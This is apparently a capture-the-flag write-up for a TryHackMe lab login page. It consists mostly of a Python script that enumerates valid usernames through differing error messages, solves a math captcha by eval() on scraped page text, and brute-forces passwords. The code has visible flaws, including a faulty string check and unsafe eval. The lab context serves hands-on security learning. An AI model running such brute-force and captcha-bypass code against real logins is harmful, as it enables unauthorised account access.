# TRYHACKME CAPTURE!

The box is a web page with a login page
After few trials a math captcha comes up

which needs solving

There are 3 different errors

1. Error for Invalid Username
2. Error for Invalid Captcha
3. And lastly, Error for Invalid Password

I wrote a python script to brute force for the Username and Password, get the Captcha and solve it

#!/bin/bash/env python3
#AUTHOR FAD-X

import requests
import bs4
from bs4 import BeautifulSoup

### THE FUNCTION THAT SOLVES THE CAPTCHA

def solve_captcha():
soup = BeautifulSoup(request.text, 'html.parser')
start_index = request.text.find('<br>')
end_index = request.text.find('= ?')
equation = request.text[start_index + 4:end_index].strip()
solution = eval(equation)
return solution

url ="[http://10.10.34.117/login](http://10.10.34.117/login)"

## READING THE WORDLISTS TO A LIST

usernames = []
with open("usernames.txt", "r") as file:
usernames = file.read().splitlines()

password = []
with open("passwords.txt", "r") as file:
passwords = file.read().splitlines()

#####SETTING AN ITERATOR FOR CHANGING THE USERNAME AND PASSWORD

username_counter = 0
password_counter = 0
data = {
"username":usernames[username_counter],
"password":passwords[password_counter]
}

request = requests.post(url,data=data)

## FIRST LOOP TO GET THE USERNAME AND ALSO SOLVE THE CAPTCHA

while True:
for i in range(len(usernames)):
captcha_solution = solve_captcha()

```
data = {
  "username":usernames[username_counter],
  "password":passwords[password_counter],
  "captcha":captcha_solution
}
request = requests.post(url, data=data)
#print(request.text)
if ("The user" and "does not exist") in request.text:
  #print(f"Username is Not {usernames[username_counter]}")
  username_counter +=1
elif ("Invalid password for user" in request.text):
  real_username = usernames[username_counter]
  print(f"Gotten The Username to be {real_username}")

#### SECOND LOOP TO BRUTEFORCE FOR CORRESPONDING PASSWORD
  for i in range(len(passwords)):
    captcha_solution = solve_captcha()
    data_2 = {
          "username":real_username,
          "password":passwords[password_counter],
          "captcha":captcha_solution
        }

    request = requests.post(url, data=data_2)
    if ("Invalid password"   in request.text):
      password_counter +=1
    else:
      print(f"The Username is {usernames[username_counter]} and the password is {passwords[password_counter]}")
      flag = BeautifulSoup(request.text, 'html.parser')
      print(flag)
      exit()

```

![2023-05-26_22-03.png](TRYHACKME%20CAPTURE!%206b09ddb609fc40c788877387d8567ffd/2023-05-26_22-03.png)

I’M VERY SORRY IF MY PROGRAMS LOOK AWFUL :XD